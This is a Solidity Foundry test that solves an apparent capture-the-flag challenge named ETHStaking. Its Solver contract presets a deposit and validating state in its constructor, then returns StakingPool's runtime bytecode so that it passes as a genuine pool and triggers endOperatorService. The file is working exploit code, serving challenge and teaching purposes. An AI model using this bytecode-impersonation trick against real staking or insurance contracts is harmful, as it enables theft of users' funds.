// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Challenge, StakingPool} from "../src/ETHStaking/Challenge.sol";

contract ETHStakingTest is Test {
    Challenge private challenge;
    Solver private solver;

    function setUp() external {
        skip(123123123); // Set block.timestamp (foundry has small default block.timestamp)

        challenge = new Challenge{value: 10 ether}();
        solver = new Solver(address(challenge), address(challenge.insurance()));
    }

    function test_hackETHStaking() public {
        solver.registerInsurance();
        solver.endOperatorService();

        assertTrue(challenge.isSolved());
    }

    receive() external payable {}
}

// Inherit from StakingPool to save the storage layout
contract Solver is StakingPool {
    constructor(address _operator, address _insurance) StakingPool(_operator, _insurance) {
        // To pass the `deposits[msg.sender] > 0` check in `endOperatorService` function
        deposits[msg.sender] = 1;
        // To pass the `state == State.Validating` check in `endOperatorService` and `registerInsurance` functions
        state = State.Validating;

        // Return the same bytecode with `StakingPool`
        bytes memory code = type(StakingPool).runtimeCode;
        assembly {
            return(add(code, 0x20), mload(code))
        }
    }
}
